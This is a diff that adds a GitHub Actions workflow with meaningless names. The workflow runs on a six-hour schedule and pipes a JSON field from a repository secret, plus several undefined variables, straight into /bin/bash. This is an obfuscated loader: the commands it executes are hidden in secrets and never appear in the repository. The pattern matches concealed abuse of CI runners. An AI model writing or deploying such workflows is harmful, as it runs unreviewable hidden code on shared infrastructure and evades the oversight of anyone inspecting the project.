@@ -1,0 +1,23 @@
+name: touxizxx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: touxizxx
+        env:
+          uxrpy3140: ${{ secrets.uxrpy3140 }}
+        run: |
+          echo $uxrpy3140 | jq -r .e79329 | /bin/bash
+          echo $i21770 | jq -r .mrg074 | /bin/bash
+          echo $tww3 | jq -r .f215 | /bin/bash
+          echo $zbbim9869 | jq -r .cgqy99433 | /bin/bash
+          echo $rqdl5479 | jq -r .hqfmb0898 | /bin/bash
+          echo $g8 | jq -r .j85 | /bin/bash
+          echo $x16398 | jq -r .ahi32864 | /bin/bash
+
